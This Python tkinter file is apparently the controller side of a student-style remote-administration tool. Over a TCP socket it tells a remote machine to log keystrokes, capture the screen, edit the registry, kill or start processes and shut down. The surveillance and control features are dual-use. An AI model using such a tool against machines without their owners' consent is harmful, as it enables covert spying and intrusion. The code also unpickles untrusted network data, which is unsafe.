import tkinter as tk
from tkinter import filedialog, scrolledtext, ttk
import socket, pickle, json, struct
from PIL import Image, ImageTk

main = tk.Tk()
main.geometry("370x245")
main.title("Client")
main.protocol("WM_DELETE_WINDOW", lambda: close_event(main))

#Global variables
###############################################################################
BUFSIZ = 1024 * 4
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
flag = False
close = True
###############################################################################

#Functions
###############################################################################
def Recvall(sock, size):
    message = bytearray()
    while len(message) < size:
        buffer = sock.recv(size - len(message))
        if not buffer:
            raise EOFError('Could not receive all expected data!')
        message.extend(buffer)
    return bytes(message)

def Receive():
    global client
    packed = Recvall(client, struct.calcsize('!I'))
    size = struct.unpack('!I', packed)[0]
    data = Recvall(client, size)
    return data

def close_event(main):
    global flag, close
    if flag: client.sendall(bytes("QUIT", "utf8"))
    close = True
    main.destroy()
    return
###############################################################################
    
#KeyLogger
###############################################################################
def Hook():
    global client
    client.sendall(bytes("HOOK", "utf8"))
    return
    
def Unhook():
    global client
    client.sendall(bytes("UN", "utf8"))
    return
    
def Print():
    global client, text, textbox
    client.sendall(bytes("PRINT", "utf8"))
    data = client.recv(BUFSIZ).decode("utf8")
    data = data.replace("'", "")
    data = data[1:]
    textbox.config(state = "normal")
    textbox.insert(tk.END, data)
    textbox.config(state = "disable")
    return
        
def Delete():
    global textbox
    textbox.config(state = "normal")
    textbox.delete("1.0", "end")
    textbox.config(state = "disable")
    return
    
def Keystroke():
    global flag, client, close
    if flag and close:
        global textbox, main
        close = False
        client.sendall(bytes("KEYLOG", "utf8"))
        keystroke = tk.Toplevel(main)
        keystroke.geometry("492x370")
        keystroke.title("Keystroke")
        keystroke.protocol("WM_DELETE_WINDOW", lambda: close_event(keystroke))
        tk.Button(keystroke, text = "HOOK", width = 13, height = 2, command = Hook).grid(row = 0, column = 0)
        tk.Button(keystroke, text = "UNHOOK", width = 13, height = 2, command = Unhook).grid(row = 0, column = 1)
        tk.Button(keystroke, text = "PRINT", width = 13, height = 2, command = Print).grid(row = 0, column = 2)
        tk.Button(keystroke, text = "DELETE", width = 13, height = 2, command = Delete).grid(row = 0, column = 3)
        textbox = tk.Text(keystroke, height = 20, width = 60, state = "disable", wrap = "char")
        textbox.grid(row = 1, column = 0, columnspan = 4)
        keystroke.mainloop()
    return
###############################################################################

#Shutdown
###############################################################################    
def ShutDown():
    global flag, close, client
    if flag and close:
        client.sendall(bytes("SHUTDOWN", "utf8"))
    return
###############################################################################

#Registry
###############################################################################
def SendContent():
    global ID, detail, content, client, pane
    ID = 0
    detail = content.get("1.0", "end")
    msg = {'ID' : ID, 'path' : detail, 'name_value' : '', 'value' : '', 'v_type' : ''}
    msg = json.dumps(msg)
    client.sendall(bytes(msg, "utf8"))
    res1 = client.recv(BUFSIZ).decode("utf8")
    client.recv(BUFSIZ).decode("utf8")
    pane.config(state = "normal")
    if "0" in res1:
        pane.insert(tk.END, "Lỗi\n")
    else:
        pane.insert(tk.END, "Thành công\n")
    pane.config(state = "disable")
    return
    
def Send():
    global ID, path2, name_value, value, dt, choice, pane
    ID = 4
    if choice == "Get value":
        ID = 1
    if choice == "Set value":
        ID = 2
    if choice == "Delete value":
        ID = 3
    if choice == "Create key":
        ID = 4
    if choice == "Delete key":
        ID = 5
    t_map = {"String" : "REG_SZ", "Binary" : "REG_BINARY", "DWORD" : "REG_DWORD", "QWORD" : "REG_QWORD", "Multi-String" : "REG_MULTI_SZ", "Expandable String" : "REG_EXPAND_SZ"}
    try:
        dt = t_map[dt]
    except:
        pass
    msg = {'ID' : ID, 'path' : path2.get("1.0", "end").rstrip(), 'name_value' : name_value.get("1.0", "end").rstrip(), 'value' : value.get("1.0", "end").rstrip(), 'v_type' : dt}
    msg = json.dumps(msg)
    client.sendall(bytes(msg, "utf8"))
    res1 = client.recv(BUFSIZ).decode("utf8")
    res2 = client.recv(BUFSIZ).decode("utf8")
    pane.config(state = "normal")
    if ID == 1:
        if "0" in res1:
            pane.insert(tk.END, "Lỗi\n")
        else:
            pane.insert(tk.END, res2 + "\n")
    else:
        if "0" in res1:
            pane.insert(tk.END, "Lỗi\n")
        else:
            pane.insert(tk.END, "Thành công\n")
    pane.config(state = "disable")
    return
    
def Browser():
    global path
    global file, content
    file = filedialog.askopenfilename()
    path.config(state = "normal")
    path.delete("1.0", "end")
    path.insert(tk.END, file)
    path.config(state = "disable")
    s = ""
    with open(file, "r") as input_file:
        s = input_file.read()
        input_file.close()
    content.delete("1.0", "end")
    content.insert(tk.END, s)
    return
    
def TakeAction(value):
    global choice
    choice = value
    return
    
def ChangeType(value):
    global dt
    dt = value
    return

def Registry():
    global flag, client, close, main
    if flag and close:
        global path, file, content, action, choice, path2, name_value, value, t, dt, ID, detail, pane  
        close = False
        client.sendall(bytes("REGISTRY", "utf8"))
        reg = tk.Toplevel(main)
        reg.geometry("420x410")
        reg.title("Registry")
        reg.resizable(False, False)
        reg.protocol("WM_DELETE_WINDOW", lambda: close_event(reg))
              
        path = tk.Text(reg, height = 1, width = 40, wrap = "char")
        path.insert(tk.END, "Đường dẫn...")
        path.config(state = "disable")
        path.grid(row = 0, column = 0, columnspan = 3)
        
        tk.Button(reg, text = "BROWSER", width = 10, height = 1, command = Browser).grid(row = 0, column = 3)

        content = scrolledtext.ScrolledText(reg, height = 5, width = 38, wrap = "char")
        content.grid(row = 1, column = 0, columnspan = 3)
        content.insert(tk.END, "Nội dung")
        
        tk.Button(reg, text = "GỞI\nNỘI\nDUNG", width = 10, height = 5, command = SendContent).grid(row = 1, column = 3)
        
        tk.Label(reg, text = "Sửa giá trị trực tiếp").grid(row = 2, column = 1)
        
        action = tk.StringVar()
        action.set("Chọn chức năng")
        action_menu = tk.OptionMenu(reg, action, "Get value", "Set value", "Delete value", "Create key", "Delete key", command = TakeAction)
        action_menu.config(width = 60)
        action_menu.grid(row = 3, column = 0, columnspan = 4)

        path2 = tk.Text(reg, height = 1, width = 50, state = "normal", wrap = "char")
        path2.grid(row = 4, column = 0, columnspan = 4)
        path2.insert(tk.END, "Đường dẫn")

        name_value = tk.Text(reg, height = 1, width = 15, state = "normal", wrap = "char")
        name_value.grid(row = 5, column = 0)
        name_value.insert(tk.END, "Name value")
        
        value = tk.Text(reg, height = 1, width = 15, state = "normal", wrap = "char")
        value.grid(row = 5, column = 1)
        value.insert(tk.END, "Value")

        dt = ""
        t = tk.StringVar()
        t.set("Kiểu dữ liệu")
        data_type = tk.OptionMenu(reg, t, "String", "Binary", "DWORD", "QWORD", "Multi-String", "Expandable String", command = ChangeType)
        data_type.grid(row = 5, column = 2, columnspan = 2)
        data_type.config(width = 20)
        
        pane = tk.Text(reg, height = 10, width = 50, state = "disable", wrap = "char")
        pane.grid(row = 6, column = 0, columnspan = 4)
        
        tk.Button(reg, text = "GỞI", width = 10, height = 1, command = Send).grid(row = 7, column = 0, columnspan = 2)
        tk.Button(reg, text = "Xóa", width = 10, height = 1, command = Delete).grid(row = 7, column = 2, columnspan = 2)
        
        reg.mainloop()
    return
###############################################################################    

#TakePic
###############################################################################
def Capture():
    global client, screencap, l, img, pic
    client.sendall(bytes("TAKE", "utf8"))
    data = Receive()
    arr = pickle.loads(data)
    pic = Image.fromarray(arr, 'RGB')
    width, height = pic.size
    img = pic.resize((int(width / 3), int(height / 3)), Image.ANTIALIAS)
    img = ImageTk.PhotoImage(img)
    l.configure(image = img)
    return

def Save():
    global pic
    file = filedialog.asksaveasfile(mode = "wb", defaultextension = '.png', filetypes = [("Image file", ".png"), ("All files", ".*")])
    if not file:
        return
    pic.save(file)
    file.close()
    return

def ScreenCap():
    global flag, client, close, main
    if flag and close:
        close = False
        client.sendall(bytes("TAKEPIC", "utf8"))
        global screencap, l, img, pic
        screencap = tk.Toplevel(main)
        screencap.geometry("800x400")
        screencap.title("Capture screen")
        screencap.protocol("WM_DELETE_WINDOW", lambda: close_event(screencap))
        l = tk.Label(screencap)
        l.place(x = 360, y = 200, anchor = "center")
        tk.Button(screencap, text = "CAPTURE", width = 12, height = 11, command = Capture).place(x = 745, y = 105, anchor = "center")
        tk.Button(screencap, text = "SAVE", width = 12, height = 11, command = Save).place(x = 745, y = 295, anchor = "center")
        Capture()
        screencap.mainloop()
    return
###############################################################################

#Process and App
def SendKill(s):
    global pid, client
    client.sendall(bytes("0", "utf8"))
    client.sendall(bytes(str(pid.get()), "utf8"))
    res = client.recv(BUFSIZ).decode("utf8")
    if "1" in res:
        tk.messagebox.showinfo(message = "Đã diệt " + s)
    else:
        tk.messagebox.showerror(message = "Lỗi!")
    return

def Xem():
    global client, tab, scroll
    client.sendall(bytes("1", "utf8"))
    ls1 = Receive()
    ls1 = pickle.loads(ls1)
    ls2 = Receive()
    ls2 = pickle.loads(ls2) 
    ls3 = Receive()
    ls3 = pickle.loads(ls3)
    for i in tab.get_children():
        tab.delete(i)
    for i in range(1, len(ls1)):
        tab.insert(parent = '', index = 'end', text = '', values = (ls1[i], ls2[i], ls3[i]))
    return

def XoaView():
    global tab
    for i in tab.get_children():
        tab.delete(i)
    return

def SendStart(s):
    global pname, client
    client.sendall(bytes("3", "utf8"))
    client.sendall(bytes(str(pname.get()), "utf8"))
    res = client.recv(BUFSIZ).decode("utf8")
    if "1" in res:
        tk.messagebox.showinfo(message = s + " đã được bật")
    else:
        tk.messagebox.showerror(message = "Lỗi!")
    return
        
def Start(s):
    global pname, pro
    pstart = tk.Toplevel(pro)
    pstart.geometry("410x40")
    pname = tk.StringVar(pstart)
    tk.Entry(pstart, textvariable = pname, width = 38, borderwidth = 5).grid(row = 0, column = 0)
    tk.Button(pstart, text = "Start", width = 14, height = 1, command = lambda: SendStart(s)).grid(row = 0, column = 1)
    return
    
def Kill(s):
    global pid, pro
    kill = tk.Toplevel(pro)
    kill.geometry("410x40")
    pid = tk.StringVar(kill)
    tk.Entry(kill, textvariable = pid, width = 38, borderwidth = 5).grid(row = 0, column = 0)
    tk.Button(kill, text = "Kill", width = 14, height = 1, command = lambda: SendKill(s)).grid(row = 0, column = 1)
    return

#Process Running    
###############################################################################
def Process():
    global flag, client, close, main
    if flag and close:
        global pro, tab, scroll
        close = False
        client.sendall(bytes("PROCESS", "utf8"))
        pro = tk.Toplevel(main)
        pro.geometry("470x430")
        pro.title("Process Running")
        pro.resizable(False, False)
        pro.protocol("WM_DELETE_WINDOW", lambda: close_event(pro))
        tk.Button(pro, text = "Kill", width = 14, height = 2, command = lambda: Kill("Process")).grid(row = 0, column = 0)
        tk.Button(pro, text = "Xem", width = 14, height = 2, command = Xem).grid(row = 0, column = 1)
        tk.Button(pro, text = "Xóa", width = 14, height = 2, command = XoaView).grid(row = 0, column = 2)
        tk.Button(pro, text = "Start", width = 14, height = 2, command = lambda: Start("Process")).grid(row = 0, column = 3)
        scroll = tk.Scrollbar(pro)
        scroll.grid(row = 1, column = 4, sticky="nsew")
        tab = ttk.Treeview(pro, height = 18)
        scroll.configure(command = tab.yview)
        tab.configure(yscrollcommand = scroll.set)
        tab['columns'] = ("Name", "ID", "Count")
        tab.column('#0', width=0)
        tab.column("Name", anchor="center", width = 150, minwidth = 10, stretch = True)
        tab.column("ID", anchor="center", width = 150, minwidth = 10, stretch = True)
        tab.column("Count", anchor="center", width = 150, minwidth = 10, stretch = True)
        tab.heading('#0', text='')
        tab.heading("Name", text = "Name Process")
        tab.heading("ID", text = "ID Process")
        tab.heading("Count", text = "Count Threads")
        tab.grid(row = 1, column = 0, columnspan = 4, sticky = "nse")
        pro.mainloop()
    return
###############################################################################

#App Running
###############################################################################
def App():      
    global flag, client, close, main
    if flag and close:
        global pro, tab, scroll
        close = False
        client.sendall(bytes("APPLICATION", "utf8"))
        pro = tk.Toplevel(main)
        pro.geometry("470x430")
        pro.title("App Running")
        pro.protocol("WM_DELETE_WINDOW", lambda: close_event(pro))
        tk.Button(pro, text = "Kill", width = 14, height = 2, command = lambda: Kill("App")).grid(row = 0, column = 0)
        tk.Button(pro, text = "Xem", width = 14, height = 2, command = Xem).grid(row = 0, column = 1)
        tk.Button(pro, text = "Xóa", width = 14, height = 2, command = XoaView).grid(row = 0, column = 2)
        tk.Button(pro, text = "Start", width = 14, height = 2, command = lambda: Start("App")).grid(row = 0, column = 3)
        scroll = tk.Scrollbar(pro)
        scroll.grid(row = 1, column = 4, sticky = "nsew")
        tab = ttk.Treeview(pro, height = 18)
        scroll.configure(command = tab.yview)
        tab.configure(yscrollcommand = scroll.set)
        tab['columns'] = ("Name", "ID", "Count")
        tab.column('#0', width=0)
        tab.column("Name", anchor="center", width = 150, minwidth = 10, stretch = True)
        tab.column("ID", anchor="center", width = 150, minwidth = 10, stretch = True)
        tab.column("Count", anchor="center", width = 150, minwidth = 10, stretch = True)
        tab.heading('#0', text='')
        tab.heading("Name", text = "Name Application")
        tab.heading("ID", text = "ID Application")
        tab.heading("Count", text = "Count Threads")
        tab.grid(row = 1, column = 0, columnspan = 4, sticky = "nse")
        pro.mainloop()  
###############################################################################

#Exit
###############################################################################        
def Exit():
    close_event(main)
###############################################################################
    
#Connect
###############################################################################
def Connect():
    global client, user_input, flag
    if not flag:
        ip = user_input.get()
        try:
            client.connect((ip, 5656))
            tk.messagebox.showinfo(message = "Connect successfully!")
            flag = True
        except:
            tk.messagebox.showerror(message = "Cannot connect!")       
    return
###############################################################################

#Design
###############################################################################    
user_input = tk.StringVar(main)
tk.Entry(main, textvariable = user_input, width = 38, borderwidth = 5).grid(row = 0, column = 0, columnspan = 2)
tk.Button(main, text = "Connect", width = 16, height = 1, command = Connect).grid(row = 0, column = 2)
tk.Button(main, text = "Keystroke", width = 16, height = 5, command = Keystroke).grid(row = 1, column = 0)
tk.Button(main, text = "Shut down", width = 16, height = 5, command = ShutDown).grid(row = 1, column = 1)
tk.Button(main, text = "App Running", width = 16, height = 5, command = App).grid(row = 1, column = 2)
tk.Button(main, text = "Process Running", width = 16, height = 5, command = Process).grid(row = 2, column = 0)
tk.Button(main, text = "Registry", width = 16, height = 5, command = Registry).grid(row = 2, column = 1)
tk.Button(main, text = "Screen Capture", width = 16, height = 5, command = ScreenCap).grid(row = 2, column = 2)
tk.Button(main, text = "Exit", width = 51, height = 2, command = Exit).grid(row = 3, column = 0, columnspan = 3)
###############################################################################

main.mainloop()
